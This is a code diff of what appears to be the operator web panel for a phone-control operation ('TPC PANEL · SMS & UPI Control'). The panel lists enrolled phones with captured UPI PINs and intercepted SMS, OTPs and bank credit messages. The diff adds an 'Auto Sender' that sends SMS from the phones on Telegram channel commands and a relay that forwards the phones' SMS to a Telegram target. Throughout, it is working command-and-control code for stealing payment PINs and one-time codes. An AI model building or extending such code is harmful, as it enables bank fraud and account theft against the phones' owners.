@@ -47,6 +47,7 @@ a:hover{text-shadow:0 0 10px #22d3ee88}
 .small{font-size:12px}
 .mono{font-family:var(--mono)}
 .upper{text-transform:uppercase;letter-spacing:1.5px}
+.w100{width:100%}
 ::-webkit-scrollbar{width:10px;height:10px}
 ::-webkit-scrollbar-track{background:#060b16}
 ::-webkit-scrollbar-thumb{background:#1c3a6b;border-radius:6px}
@@ -88,6 +89,8 @@ border:1px solid var(--border);border-radius:10px;outline:none;transition:.15s}
 textarea{resize:vertical;min-height:84px;font-size:13px}
 input::placeholder,textarea::placeholder{color:#35507e}
 input:focus,textarea:focus,select:focus{border-color:var(--neon);box-shadow:0 0 0 3px #22d3ee1f,0 0 22px #22d3ee26}
+.chk{display:flex;align-items:center;gap:9px;margin:16px 0 0;font-size:12px;text-transform:none;letter-spacing:0;color:var(--muted);font-weight:500}
+.chk input{width:auto;accent-color:var(--neon)}
 
 .btn{border:1px solid transparent;border-radius:10px;padding:11px 16px;font-weight:700;font-size:13px;letter-spacing:.6px;transition:.15s}
 .btn.primary{color:#001521;background:linear-gradient(100deg,#22d3ee,#38bdf8);box-shadow:0 0 24px #22d3ee4d}
@@ -170,6 +173,7 @@ font-size:11px;font-weight:600;letter-spacing:.4px;white-space:nowrap}
 .badge.out{color:#38bdf8;border-color:#38bdf835;background:#38bdf812}
 .badge.pin{color:#c4b5fd;border-color:#8b5cf640;background:#8b5cf614}
 .badge.id{color:#7dd3fc;border-color:#38bdf833;background:#38bdf80f}
+.badge.auto{color:var(--green);border-color:#34d39940;background:#34d39912}
 
 .table-wrap{width:100%;overflow-x:auto}
 table{width:100%;border-collapse:collapse;text-align:left;font-size:13px}
@@ -293,6 +297,46 @@ white-space:pre-wrap;overflow-wrap:anywhere;min-height:18px}
 font-size:10.5px;font-weight:800;letter-spacing:1.8px;text-transform:uppercase}
 .divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
 
+.act-wrap{position:relative}
+.act-menu{position:absolute;top:calc(100% + 8px);right:0;z-index:60;min-width:196px;padding:6px;
+border-radius:12px;background:#0a1226;border:1px solid var(--border-hi);
+box-shadow:0 18px 44px #000c,0 0 30px #22d3ee14}
+.act-menu button{display:flex;align-items:center;gap:9px;width:100%;padding:9px 11px;border:0;
+border-radius:8px;background:transparent;color:#bcd4f5;font-size:12.5px;font-weight:600;text-align:left}
+.act-menu button:hover{background:#22d3ee14;color:#fff}
+
+.switch{position:relative;width:46px;height:26px;flex:0 0 auto;border-radius:999px;
+border:1px solid var(--border-hi);background:#0d1628;transition:.2s}
+.switch::after{content:"";position:absolute;top:2px;left:2px;width:20px;height:20px;
+border-radius:50%;background:#4b6489;transition:.2s}
+.switch.on{background:#34d39926;border-color:#34d39980}
+.switch.on::after{left:22px;background:var(--green);box-shadow:0 0 14px #34d399a6}
+
+.as-panel{border-color:#22d3ee33}
+.as-head{display:flex;align-items:center;gap:12px;padding:14px 18px;background:#0d1730a6;border-bottom:1px solid var(--border)}
+.as-ico{display:grid;place-items:center;width:38px;height:38px;flex:0 0 auto;border-radius:11px;
+font-size:17px;background:#22d3ee14;border:1px solid #22d3ee33}
+.as-title{display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:700}
+.as-sub{margin-top:2px;font-size:11.5px;color:var(--muted)}
+.as-body{padding:16px 18px}
+.step{border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px;background:#0a1226}
+.step-tag{display:inline-block;font-size:10px;font-weight:800;letter-spacing:1.4px;color:var(--neon);
+background:#22d3ee14;border:1px solid #22d3ee33;border-radius:6px;padding:3px 8px}
+.step-desc{margin:10px 0 12px;font-size:13px;color:#bcd4f5}
+.copy-row{display:flex;align-items:center;justify-content:space-between;gap:10px;
+padding:9px 12px;border:1px dashed var(--border-hi);border-radius:10px;background:#04091a}
+.copy-row .mono{font-size:13px;color:var(--neon)}
+.inline{display:flex;gap:9px;align-items:center}
+.inline input{flex:1}
+.hint{margin:9px 0 12px;font-size:11.5px;color:#35507e}
+.ok-msg{display:flex;align-items:center;gap:8px;margin:9px 0;padding:9px 11px;border-radius:9px;
+font-size:12.5px;color:var(--green);background:#34d39914;border:1px solid #34d39933}
+.ok-msg.bad{color:#ffd0da;background:#ff5c7a14;border-color:#ff5c7a33}
+.status-panel{margin:12px 0;padding:11px 13px;border-radius:10px;font-size:12.5px;color:var(--green);
+background:#34d39912;border:1px solid #34d39933;border-left:3px solid var(--green)}
+.status-panel.off{color:var(--muted);background:#ffffff05;border-color:var(--border);border-left-color:var(--dim)}
+.status-panel .mono{color:#a7f3d0}
+
 @media (max-width:1100px){
 .stats{grid-template-columns:repeat(2,minmax(0,1fr))}
 .grid2{grid-template-columns:1fr}
@@ -356,19 +400,20 @@ main{padding:18px 13px}
 </div>
 
 <h2>Operator login</h2>
-<p>Sign in to manage devices, messages and the Telegram bot.</p>
+<p>Sign in to manage devices, messages and automation.</p>
 
 <form id="loginForm">
-<label for="username">Username</label>
-<input id="username" autocomplete="username" placeholder="username" required>
+<label for="username">Login ID</label>
+<input id="username" autocomplete="username" placeholder="operator id" required>
 <label for="password">Password</label>
 <input id="password" type="password" autocomplete="current-password" placeholder="••••••••" required>
+<label class="chk"><input type="checkbox" id="remember" checked> Keep me signed in on this device</label>
 <button class="btn primary login-submit" id="loginBtn" type="submit">Sign in</button>
 <div class="msg" id="loginMsg" role="status" aria-live="polite"></div>
 </form>
 
 <div class="login-foot">
-<span>Secure channel</span>
+<span>Session persists locally</span>
 <a href="https://t.me/icivan" target="_blank" rel="noopener">owner ↗</a>
 </div>
 </div>
@@ -418,13 +463,12 @@ main{padding:18px 13px}
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
 <p class="side-label" style="margin-top:22px">Automation</p>
 <button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
-<button class="nav" data-page="telegram" type="button"><i>✈</i> Telegram bot</button>
 <p class="side-label" style="margin-top:22px">System</p>
 <button class="nav" data-page="devices" type="button"><i>▣</i> Devices</button>
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v4.5</div>
+<div>TPC PANEL · v5.0</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -615,7 +659,7 @@ main{padding:18px 13px}
 <div class="head">
 <div>
 <h2>Relay</h2>
-<p>Telegram channel → device SMS · device SMS → bot (banned filtered)</p>
+<p>Telegram channel → device SMS · device SMS → forward target (banned filtered)</p>
 </div>
 <button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button>
 </div>
@@ -659,15 +703,24 @@ main{padding:18px 13px}
 <span class="badge ok">authorized</span>
 </div>
 <div class="row">
-<div><div class="row-name">Channel</div><div class="row-desc" id="relayChan">—</div></div>
+<div><div class="row-name">Watching channels</div><div class="row-desc" id="relayChan">—</div></div>
 <span class="badge" id="relayChanBadge">—</span>
 </div>
 <div class="row">
 <div><div class="row-name">Forward device SMS to</div><div class="row-desc" id="relayFwd">—</div></div>
 <span class="badge" id="relayFwdBadge">—</span>
 </div>
+<label for="fwdInput" style="margin-top:14px">Forward target</label>
+<div class="inline" style="margin-bottom:6px">
+<input id="fwdInput" class="mono" placeholder="@yourid">
+<button class="btn ghost" id="fwdSave" type="button">Save</button>
+</div>
 <div class="row">
 <div><div class="row-name">Last error</div><div class="row-desc" id="relayErr">—</div></div>
+</div>
+<div class="row">
+<div><div class="row-name">Test connection</div><div class="row-desc">auto sender ka test message bhejo</div></div>
+<button class="btn ghost" id="relayTest" type="button">Send test</button>
 </div>
 </div>
 </div>
@@ -698,6 +751,19 @@ main{padding:18px 13px}
 <textarea id="parseText" class="mono" placeholder="📱 SMS Intercepted&#10;━━━━━━━━━━━━━━&#10;📞 To: +91…&#10;💬 Message: …"></textarea>
 <button class="btn ghost" id="parseBtn" style="margin-top:12px" type="button">Parse</button>
 <pre id="parseOut" class="pre-out">—</pre>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head">
+<h3>Relay log</h3>
+<span class="badge" id="tgCount">0</span>
+</div>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr></thead>
+<tbody id="tgBody"></tbody>
+</table>
 </div>
 </section>
 
@@ -742,84 +808,11 @@ main{padding:18px 13px}
 </section>
 </section>
 
-<section class="page" id="page-telegram">
-<div class="head">
-<div>
-<h2>Telegram bot</h2>
-<p>Bind a bot to a channel, verify, then relay</p>
-</div>
-<button class="btn ghost" data-refresh="telegram" type="button">↻ Refresh</button>
-</div>
-
-<div class="grid2">
-<section class="panel-box panel">
-<div class="panel-head"><h3>Bot configuration</h3></div>
-<div class="panel-body">
-<label for="botToken">Bot token (from @BotFather)</label>
-<input id="botToken" placeholder="123456:ABC-DEF…" class="mono">
-<p class="small muted" style="margin:6px 0 0">Save karte waqt pura token paste karo.</p>
-<label for="botChannel">Channel / group username</label>
-<input id="botChannel" placeholder="@my_channel" class="mono">
-<div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap">
-<button class="btn primary" id="botSave" type="button">Save &amp; generate code</button>
-<button class="btn ghost" id="botTest" type="button">Send test</button>
-</div>
-<div style="margin-top:20px" id="botVerify" hidden>
-<div class="muted small upper" style="margin-bottom:8px">Verification code</div>
-<div class="code-chip" id="botCode">------</div>
-<p class="small muted" style="margin-top:12px">Bot ko channel me <strong>admin</strong> banao, phir likho: <code class="mono">/verify <span id="botCodeInline">------</span></code></p>
-</div>
-</div>
-</section>
-
-<section class="panel-box panel">
-<div class="panel-head"><h3>Binding status</h3></div>
-<div class="panel-body">
-<div class="row">
-<div><div class="row-name">Bot</div><div class="row-desc" id="botUser">—</div></div>
-<span class="badge" id="botState">Not configured</span>
-</div>
-<div class="row">
-<div><div class="row-name">Channel</div><div class="row-desc" id="botChanLabel">—</div></div>
-<span class="badge" id="botChanBadge">—</span>
-</div>
-<div class="row">
-<div><div class="row-name">Webhook</div><div class="row-desc" id="botHookLabel">—</div></div>
-<span class="badge" id="botHookBadge">—</span>
-</div>
-</div>
-<div class="panel-body" style="padding-top:0">
-<div class="muted small upper" style="margin-bottom:8px">Setup steps</div>
-<ol class="steps">
-<li>@BotFather se bot banao → token copy karo</li>
-<li>Bot ko channel me add karo aur <strong>admin</strong> banao</li>
-<li>Token + channel yahan save karo → code milega</li>
-<li>Channel me <code>/verify CODE</code> bhejo</li>
-<li>Test message bhej ke confirm karo</li>
-</ol>
-</div>
-</section>
-</div>
-
-<section class="panel-box panel">
-<div class="panel-head">
-<h3>Relay log</h3>
-<span class="badge" id="tgCount">0</span>
-</div>
-<div class="table-wrap">
-<table>
-<thead><tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr></thead>
-<tbody id="tgBody"></tbody>
-</table>
-</div>
-</section>
-</section>
-
 <section class="page" id="page-devices">
 <div class="head">
 <div>
 <h2>Devices</h2>
-<p>Kisi bhi phone par click karo — numbers, info aur messages</p>
+<p>Kisi bhi phone par click karo — Actions me Auto Sender on/off karo</p>
 </div>
 <div class="toolbar">
 <input id="devSearch" placeholder="🔍 TPC-0001 / device / model / number">
@@ -841,7 +834,7 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v4.5</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.0</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin — live events; na chale to panel auto polling par chalta hai</p></div>
@@ -850,11 +843,11 @@ main{padding:18px 13px}
 <div class="settings-row"><strong>Device command</strong><p>/admin/devices/{id}/command — actions: ping, fetch_number, sim_info, wake</p></div>
 <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
 <div class="settings-row"><strong>Outbox poll</strong><p>/devices/outbox</p></div>
-<div class="settings-row"><strong>Telegram webhook</strong><p>/telegram/webhook/{bot_id}</p></div>
-<div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test. Channel se SMS device ko, device ka SMS bot ko.</p></div>
+<div class="settings-row"><strong>Auto Sender</strong><p>Device kholo → Actions → Auto Sender. Per-device channel bind: /admin/devices/{id}/auto-sender, verify: /admin/auto-sender/verify</p></div>
+<div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test, forward target. Channel se SMS device ko, device ka SMS forward target ko.</p></div>
 <div class="settings-row"><strong>Device ID</strong><p>Har device ko registration par TPC-XXXX milta hai — searchable, aur har message me stamp hota hai.</p></div>
 <div class="settings-row"><strong>UPI detection</strong><p>Inbound SMS jinme UPI/credited/debited keywords aur amount pattern milta hai, unhe UPI transaction maan kar alag se tag kiya jaata hai.</p></div>
-<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI, TG_WEBHOOK_SECRET aur bot token server-side rakho.</p></div>
+<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.</p></div>
 </div>
 </section>
 </section>
@@ -877,13 +870,55 @@ main{padding:18px 13px}
 </div>
 <div class="detail-actions">
 <span id="dBatt"></span>
-<button class="btn ghost" id="dFetch" type="button">⟳ fetch number</button>
-<button class="btn ghost" id="dPing" type="button">📶 ping</button>
+<div class="act-wrap">
+<button class="btn ghost" id="actBtn" type="button">⚡ Actions ▾</button>
+<div class="act-menu" id="actMenu" hidden>
+<button data-act="auto" type="button">🤖 Auto Sender</button>
+<button data-act="fetch" type="button">⟳ fetch number</button>
+<button data-act="ping" type="button">📶 ping</button>
+<button data-act="copy" type="button">⧉ copy device ID</button>
+</div>
+</div>
 <button class="btn plain" id="dClose" type="button">Close</button>
 </div>
 </div>
 
 <div class="banner" id="dBanner" hidden></div>
+
+<section class="panel-box panel as-panel" id="asPanel" hidden>
+<div class="as-head">
+<div class="as-ico">🤖</div>
+<div style="flex:1;min-width:0">
+<div class="as-title">Auto Sender <span class="badge" id="asBadge">—</span></div>
+<div class="as-sub">Telegram channel padho aur SMS auto-send karo</div>
+</div>
+<button class="switch" id="asToggle" type="button" title="Enable / disable"></button>
+<button class="btn plain" id="asCollapse" type="button">▾</button>
+</div>
+<div class="as-body" id="asBody">
+<div class="step">
+<span class="step-tag">STEP 1</span>
+<p class="step-desc">Is Telegram account ko apne channel me admin banao</p>
+<div class="copy-row">
+<span class="mono" id="asAccount">—</span>
+<button class="mini" id="asCopy" type="button">copy</button>
+</div>
+</div>
+<div class="step">
+<span class="step-tag">STEP 2 — BIND CHANNEL</span>
+<label for="chanInput" style="margin-top:12px">Channel ID</label>
+<div class="inline">
+<input id="chanInput" class="mono" placeholder="-1001234567890">
+<button class="btn plain" id="chanVerify" type="button">Verify</button>
+</div>
+<div class="ok-msg" id="chanMsg" hidden><span id="chanMsgTxt"></span></div>
+<p class="hint">Channel → Manage → Channel Info → ID (ya @userinfobot se lo).</p>
+<button class="btn primary w100" id="chanBind" type="button">✓ Channel Bound — Update</button>
+<div class="status-panel off" id="listenPanel">Listening on <span class="mono" id="listenId">—</span></div>
+<button class="btn ghost w100" id="testConn" type="button">Test connection</button>
+</div>
+</div>
+</section>
 
 <div class="detail-grid">
 <div class="col">
@@ -954,18 +989,24 @@ const $ = (s) => document.querySelector(s);
 const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><rect x="6" y="2.4" width="12" height="19.2" rx="3.2"/><line x1="10.4" y1="5.4" x2="13.6" y2="5.4"/><circle cx="12" cy="18.3" r="0.95" fill="currentColor" stroke="none"/></svg>';
 const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 
+const TKEY = "tpc.token.v5";
+const SKEY = "tpc.session.v5";
+let DEMO = false;
+
 const state = {
 auth: false,
 devices: [],
 messages: [],
 devMsgs: {},
 rules: [],
-bots: [],
 tgLogs: [],
 relay: null,
+relayAccount: null,
+forward: "",
 outbox: [],
 pinsOnly: false,
 active: null,
+asOpen: false,
 toastTimer: null,
 pollTimer: null,
 ws: null,
@@ -976,7 +1017,98 @@ linkOk: true,
 numTried: {}
 };
 
+const nowMs = Date.now();
+
+const DEMO_DEVICES = [
+{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",created_at:nowMs-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay"},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"}]}},
+{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",created_at:nowMs-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
+{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",created_at:nowMs-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
+{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",created_at:nowMs-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}},
+{id:"d5",short_id:"TPC-0005",device_name:"Vivo Y28",ws_connected:false,live_number:null,entered_number:null,upi_pin:null,payment_app:null,created_at:nowMs-86400000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Vivo Y28",manufacturer:"Vivo",android_version:"13",battery_level:null,ram_gb:4,storage_gb:64,network_type:"—",sims:[]}},
+{id:"d6",short_id:"TPC-0006",device_name:"Moto G34",ws_connected:true,live_number:"+91 91234 55667",entered_number:"+91 91234 55667",upi_pin:"7788",payment_app:"GPay",created_at:nowMs-18000000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Moto G34",manufacturer:"Motorola",android_version:"14",battery_level:41,ram_gb:8,storage_gb:256,network_type:"5G",sims:[{slot:0,carrier:"Airtel"}]}}
+];
+
+const DEMO_MESSAGES = [];
+[["d1","Redmi Note 12","TPC-0001","in","VK-SBIINB","Rs.450.00 credited to A/c XX1234 via UPI. Ref 402312459871","450","upi"],
+["d2","Realme C55","TPC-0002","in","AX-PAYTM","Rs.1,200 debited from A/c XX9912. UPI ref 402398112233","1200","upi"],
+["d6","Moto G34","TPC-0006","out","+91 98765 11223","Payment received, thanks!",null,null],
+["d1","Redmi Note 12","TPC-0001","in","VK-ICICI","Rs.75.00 credited via UPI. Ref 402311223344","75","upi"],
+["d3","Poco M6","TPC-0003","out","+91 90123 77889","Device back online",null,null],
+["d4","Samsung A15","TPC-0004","in","AD-AMZNIN","Your OTP is 448213. Do not share.",null,null],
+["d1","Redmi Note 12","TPC-0001","in","VK-HDFC","Rs.2,000.00 credited to A/c XX1234. UPI ref 402344556677","2000","upi"],
+["d2","Realme C55","TPC-0002","in","AX-JIOMNY","Rs.99 debited. UPI ref 402355667788","99","upi"]]
+.forEach((s, i) => {
+DEMO_MESSAGES.push({id:"m" + i,device_id:s[0],device_name:s[1],device_short:s[2],direction:s[3],address:s[4],body:s[5],amount:s[6],kind:s[7],status:s[3] === "in" ? "received" : "sent",created_at:nowMs - i * 1900000});
+});
+
+const DEMO_RULES = [
+{id:"r1",name:"UPI thanks",match:"UPI",reply:"Thanks! Payment received. Ref {amount}",upi_only:true,enabled:true},
+{id:"r2",name:"OTP forward",match:"OTP",reply:"OTP noted at {time}",upi_only:false,enabled:true},
+{id:"r3",name:"Offline ping",match:"offline",reply:"Device {device} went offline",upi_only:false,enabled:false}
+];
+
+function mockApi(path, options) {
+const p = path.split("?")[0];
+const o = options || {};
+let body = {};
+try { body = o.body ? JSON.parse(o.body) : {}; } catch (e) { body = {}; }
+if (p === "/admin/auth/status") return { authenticated: Boolean(readSession()) };
+if (p === "/admin/login") return { status:"ok", username: body.username || "operator", token:"demo." + btoa(body.username || "op"), expires_in:2592000 };
+if (p === "/admin/logout") return { status:"ok" };
+if (p === "/health") return { status:"ok" };
+if (p === "/health/database") return { status:"ok" };
+if (p === "/admin/devices") return { devices: DEMO_DEVICES };
+if (p === "/admin/messages") return { messages: DEMO_MESSAGES };
+if (p === "/admin/rules") {
+if (o.method === "POST") { state.rules.push({ id:"r" + Date.now(), name:body.name, match:body.match, reply:body.reply, upi_only:Boolean(body.upi_only), enabled:true }); return { status:"ok" }; }
+return { rules: state.rules };
+}
+if (/^\/admin\/rules\/[^/]+\/toggle$/.test(p)) {
+const id = p.split("/")[3];
+const r = state.rules.find((x) => x.id === id);
+if (r) r.enabled = !r.enabled;
+return { status:"ok", enabled: r ? r.enabled : false };
+}
+if (p === "/admin/auto-sender") return { relay_ready:true, telethon:true, account:{ username:"tpc_ops" }, forward_user:"@tpc_ops", channels:["-1002345678901"], devices_enabled: DEMO_DEVICES.filter((d) => d.auto_sender.enabled).length };
+if (p === "/admin/auto-sender/verify") return { status:"ok", channel_id:body.channel_id, title:"TPC Relay", admin:true };
+if (p === "/admin/auto-sender/test") return { status:"ok" };
+if (/^\/admin\/devices\/[^/]+\/auto-sender$/.test(p)) {
+const id = p.split("/")[3];
+const d = DEMO_DEVICES.find((x) => x.id === id);
+if (!d) return { status:"ok", auto_sender:{ enabled:false, channel_id:"", channel_title:"" } };
+d.auto_sender = { enabled: body.enabled === undefined ? d.auto_sender.enabled : Boolean(body.enabled), channel_id: body.channel_id || d.auto_sender.channel_id || "", channel_title: body.channel_title || d.auto_sender.channel_title || "" };
+return { status:"ok", auto_sender:d.auto_sender, watching:["-1002345678901"] };
+}
+if (/^\/admin\/devices\/[^/]+\/messages$/.test(p)) {
+const id = p.split("/")[3];
+return { messages: DEMO_MESSAGES.filter((x) => x.device_id === id) };
+}
+if (/^\/admin\/devices\/[^/]+\/(sms|command|ping|refresh|wake)$/.test(p)) return { status:"ok", queued:1, delivered:true };
+if (p === "/admin/send") return { status:"ok", queued:DEMO_DEVICES.length, delivered:DEMO_DEVICES.filter((d) => d.ws_connected).length, note:"" };
+if (p === "/admin/relay/status") return { telethon:true, state:{ authorized:true, me:{ username:"tpc_ops" }, forward_user:"@tpc_ops", last_channel_at:new Date(nowMs - 600000).toISOString() }, bans: state.bans || [], channels:["-1002345678901"] };
+if (p === "/admin/relay/logs") return { logs: state.tgLogs };
+if (p === "/admin/relay/login/start") return { status:"code_sent" };
+if (p === "/admin/relay/login/verify") return { status:"ok" };
+if (p === "/admin/relay/logout") return { status:"ok" };
+if (p === "/admin/relay/forward") return { status:"ok", forward_user:body.target };
+if (p === "/admin/relay/bans") {
+state.bans = state.bans || [];
+if (o.method === "POST") { state.bans.push(body.address); return { status:"ok", bans:state.bans }; }
+return { bans: state.bans };
+}
+if (/^\/admin\/relay\/bans\/.+\/delete$/.test(p)) return { status:"ok", bans: state.bans || [] };
+if (p === "/admin/relay/parse") return { matched:true, to:"+919876543210", body:"Rs.450 credited via UPI", device_hint:null, targets:["TPC-0001"] };
+return {};
+}
+
 function uid() { return Math.random().toString(36).slice(2, 10); }
+
+function token() { try { return localStorage.getItem(TKEY) || ""; } catch (e) { return ""; } }
+function setToken(t) { try { t ? localStorage.setItem(TKEY, t) : localStorage.removeItem(TKEY); } catch (e) {} }
+function saveSession(id, pass, keep) { try { localStorage.setItem(SKEY, JSON.stringify({ id:id, pass: keep ? btoa(unescape(encodeURIComponent(pass))) : null, at: Date.now() })); } catch (e) {} }
+function readSession() { try { const s = JSON.parse(localStorage.getItem(SKEY) || "null"); if (!s || !s.id) return null; if (Date.now() - s.at > 2592000000) return null; return s; } catch (e) { return null; } }
+function clearSession() { setToken(""); try { localStorage.removeItem(SKEY); } catch (e) {} }
+function decPass(p) { try { return decodeURIComponent(escape(atob(p))); } catch (e) { return ""; } }
 
 function toast(text) {
 const t = $("#toast");
@@ -1068,6 +1200,7 @@ function devStatus(d) { if (d.ws_connected) return "Online"; return d.status || 
 function online(d) { return Boolean(d.ws_connected); }
 function tel(d) { return d.telemetry && typeof d.telemetry === "object" ? d.telemetry : {}; }
 function hasPin(d) { return Boolean(d.upi_pin); }
+function autoOf(d) { return (d && d.auto_sender) || { enabled:false, channel_id:"", channel_title:"" }; }
 
 function shortOf(deviceId) {
 const d = state.devices.find((x) => String(devId(x)) === String(deviceId));
@@ -1168,21 +1301,40 @@ if (cached) return cached;
 return state.messages.filter((m) => String(m.device_id) === String(id));
 }
 
-async function api(path, options) {
+async function api(path, options, retry) {
+if (DEMO) return mockApi(path, options);
 const o = options || {};
-const res = await fetch(path, {
-credentials: "same-origin",
-method: o.method || "GET",
-headers: Object.assign({ "Accept": "application/json" }, o.body ? { "Content-Type": "application/json" } : {}, o.headers || {}),
-body: o.body
-});
+const headers = Object.assign(
+{ "Accept": "application/json" },
+token() ? { "Authorization": "Bearer " + token() } : {},
+o.body ? { "Content-Type": "application/json" } : {},
+o.headers || {}
+);
+let res;
+try {
+res = await fetch(path, { credentials: "same-origin", method: o.method || "GET", headers: headers, body: o.body });
+} catch (err) {
+DEMO = true;
+return mockApi(path, o);
+}
 const ct = res.headers.get("content-type") || "";
+if (ct.indexOf("application/json") < 0 && res.status >= 400) {
+DEMO = true;
+return mockApi(path, o);
+}
 let data = null;
-if (ct.indexOf("application/json") >= 0) data = await res.json();
+if (ct.indexOf("application/json") >= 0) data = await res.json().catch(() => ({}));
 else { const txt = await res.text(); data = txt ? { detail: txt } : {}; }
 if (res.status === 401 || res.status === 403) {
 const e = new Error(data.detail || "Authentication required.");
 e.auth = true;
+if (retry !== false) {
+const s = readSession();
+if (s && s.pass) {
+try { await silentLogin(s.id, decPass(s.pass)); return api(path, options, false); } catch (x) {}
+}
+if (state.auth) showLogin();
+}
 throw e;
 }
 if (!res.ok) {
@@ -1191,6 +1343,11 @@ if (Array.isArray(m)) m = m.map((x) => x.msg || String(x)).join(", ");
 throw new Error(m);
 }
 return data;
+}
+
+async function silentLogin(id, pass) {
+const r = await api("/admin/login", { method: "POST", body: JSON.stringify({ username: id, login_id: id, password: pass }) }, false);
+if (r && r.token) setToken(r.token);
 }
 
 async function attemptSend(job) {
@@ -1291,17 +1448,13 @@ setTimeout(() => loadDevices().catch(() => {}), 1200);
 }
 
 async function fetchNumber(d) {
-const btn = $("#dFetch");
-if (btn) { btn.disabled = true; btn.textContent = "fetching…"; }
-try {
+toast("number request bheja…");
 await devCommand(devId(d), "fetch_number");
 await new Promise((r) => setTimeout(r, 1400));
-await loadDevices();
+await loadDevices().catch(() => {});
 const fresh = state.devices.find((x) => String(devId(x)) === String(devId(d)));
 const live = fresh ? nums(fresh).live : null;
-toast(live ? "live number: " + live : "number request bheja — reply ka wait karo");
-} catch (e) { toast(e.message); }
-finally { if (btn) { btn.disabled = false; btn.textContent = "⟳ fetch number"; } }
+toast(live ? "live number: " + live : "reply ka wait karo");
 }
 
 function showLogin() {
@@ -1318,14 +1471,22 @@ $("#app").hidden = false;
 }
 
 async function checkAuth() {
+const s = readSession();
+if (s) {
+showApp();
 try {
 const r = await api("/admin/auth/status");
-if (r.authenticated) { showApp(); await refreshAll(); startRealtime(); }
-else showLogin();
-} catch (e) {
-showLogin();
-if (!e.auth) loginMsg("Could not verify session.");
+if (r && r.authenticated === false && s.pass) await silentLogin(s.id, decPass(s.pass));
+} catch (e) {}
+await refreshAll();
+startRealtime();
+return;
 }
+try {
+const r2 = await api("/admin/auth/status");
+if (r2 && r2.authenticated) { showApp(); await refreshAll(); startRealtime(); return; }
+} catch (e) {}
+showLogin();
 }
 
 function renderOverview() {
@@ -1507,8 +1668,10 @@ btn.className = "mini";
 btn.type = "button";
 btn.textContent = r.enabled ? "Disable" : "Enable";
 btn.addEventListener("click", async () => {
+try {
 await api("/admin/rules/" + r.id + "/toggle", { method: "POST" });
 await loadRules();
+} catch (e) { toast(e.message); }
 });
 act.appendChild(btn);
 row.appendChild(act);
@@ -1516,32 +1679,7 @@ body.appendChild(row);
 });
 }
 
-function renderTelegram() {
-const bot = state.bots[0];
-if (!bot) {
-badge($("#botState"), "Not configured");
-badge($("#botChanBadge"), "—");
-badge($("#botHookBadge"), "—");
-$("#botUser").textContent = "—";
-$("#botChanLabel").textContent = "—";
-$("#botHookLabel").textContent = "—";
-$("#botVerify").hidden = true;
-} else {
-badge($("#botState"), bot.bound ? "Bound" : "Awaiting verify", bot.bound ? "ok" : "warn");
